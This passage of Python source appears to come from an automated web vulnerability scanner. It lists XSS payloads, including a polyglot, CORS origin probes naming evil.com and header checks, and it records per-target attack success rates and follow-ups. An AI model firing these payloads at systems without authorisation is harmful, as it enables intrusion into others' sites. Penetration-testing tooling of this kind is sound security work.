                success_markers=[r"HTTP/1\.1 (?:200|301|302|403)", r"admin", r"forbidden"],
                failure_markers=[r"400 Bad Request"],
                followups=[]
            ),
            Attack(
                name="dom_xss",
                category="injection",
                payloads=[
                    "<img src=x onerror=alert(1)>",
                    "javascript:alert(document.domain)",
                    "'-alert(1)-'",
                    "\"><img src=x onerror=alert(1)>",
                    "{{constructor.constructor('return this')()}}",
                    "${alert(1)}",
                    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
                ],
                indicators=["search", "q", "query", "name", "message", "comment", "text", "input", "value"],
                success_markers=[
                    r"<img[^>]*onerror", r"javascript:", r"alert\(",
                    r"onerror\s*=", r"onload\s*=", r"onclick\s*=",
                ],
                failure_markers=[r"&lt;img", r"&lt;script"],
                followups=["xss_stored"]
            ),
            Attack(
                name="cors_misconfiguration",
                category="misc",
                payloads=[
                    "Origin: https://evil.com",
                    "Origin: null",
                    "Origin: https://{target}.evil.com",
                ],
                indicators=["api", "http", "ajax", "fetch"],
                success_markers=[
                    r"Access-Control-Allow-Origin:\s*\*",
                    r"Access-Control-Allow-Origin:\s*https?://evil",
                    r"Access-Control-Allow-Origin:\s*null",
                    r"Access-Control-Allow-Credentials:\s*true",
                ],
                failure_markers=[],
                followups=[]
            ),
            Attack(
                name="security_headers_missing",
                category="misc",
                payloads=["GET /"],
                indicators=["http"],
                success_markers=["MISSING SECURITY HEADERS"],  # Set by handler
                failure_markers=[
                    "Strict-Transport-Security",
                    "Content-Security-Policy",
                    "X-Content-Type-Options",
                ],
                followups=[]
            ),
        ]

        for attack in attacks_data:
            self.attacks[attack.name] = attack

        # Extend payloads from wordlist files if available
        wordlist_map = {
            "lfi_basic": "lfi-payloads.txt",
        }
        wordlists_dir = Path(__file__).parent.parent / "wordlists"
        for attack_name, wl_file in wordlist_map.items():
            wl_path = wordlists_dir / wl_file
            if wl_path.exists() and attack_name in self.attacks:
                extra = [
                    line.strip()
                    for line in wl_path.read_text(errors="ignore").splitlines()
                    if line.strip() and not line.startswith("#")
                ]
                existing = set(self.attacks[attack_name].payloads)
                self.attacks[attack_name].payloads.extend(
                    p for p in extra if p not in existing
                )

        # Tech signatures
        self.tech_signatures = {
            "php": ["php", "<?php", ".php", "PHPSESSID"],
            "asp": [".asp", ".aspx", "ASP.NET", "__VIEWSTATE"],
            "java": [".jsp", ".do", "JSESSIONID", "java", "tomcat"],
            "python": ["python", "django", "flask", "werkzeug"],
            "node": ["express", "node", "npm"],
            "wordpress": ["wp-content", "wp-includes", "wordpress"],
            "nginx": ["nginx"],
            "apache": ["apache", "httpd"],
            "iis": ["iis", "asp.net"],
        }

    def _load(self):
        """Load saved knowledge"""
        if KNOWLEDGE_FILE.exists():
            try:
                data = json.loads(KNOWLEDGE_FILE.read_text())
                for name, stats in data.get("attack_stats", {}).items():
                    if name in self.attacks:
                        self.attacks[name].attempts = stats.get("attempts", 0)
                        self.attacks[name].successes = stats.get("successes", 0)
                self.successful_chains = data.get("successful_chains", [])
                self.target_history = data.get("target_history", {})
            except Exception as e:  # noqa: BLE001
                pass

    def save(self):
        """Save knowledge"""
        data = {
            "attack_stats": {
                name: {"attempts": a.attempts, "successes": a.successes}
                for name, a in self.attacks.items()
            },
            "successful_chains": self.successful_chains[-100:],
            "target_history": dict(list(self.target_history.items())[-500:])
        }
        KNOWLEDGE_FILE.write_text(json.dumps(data, indent=2))

    def get_attacks_for_context(self, target) -> List[str]:
        """Get relevant attacks for this target"""
        relevant = []

        url_lower = target.url.lower()
        techs = " ".join(target.technologies).lower()
        params = " ".join(target.parameters).lower()
        context = f"{url_lower} {techs} {params}"

        for name, attack in self.attacks.items():
            if not target.should_try_attack(name):
                continue

            for indicator in attack.indicators:
                if indicator.lower() in context:
                    relevant.append(name)
                    break

        relevant.sort(key=lambda n: self.attacks[n].success_rate, reverse=True)

        return relevant

    def get_followup_attacks(self, successful_attack: str) -> List[str]:
        """Get what to try next after a successful attack"""
        attack = self.attacks.get(successful_attack)
        if attack:
            return attack.followups
        return []

    def record_result(self, attack_name: str, success: bool, target_url: str):
        """Record attack result for learning"""
        if attack_name in self.attacks:
            self.attacks[attack_name].attempts += 1
            if success:
                self.attacks[attack_name].successes += 1

    def detect_technologies(self, content: str, headers: Dict) -> Set[str]:
        """Detect technologies from response"""
        techs = set()
        combined = f"{content} {json.dumps(headers)}".lower()

        for tech, signatures in self.tech_signatures.items():
            for sig in signatures:
                if sig.lower() in combined:
                    techs.add(tech)
                    break

        return techs
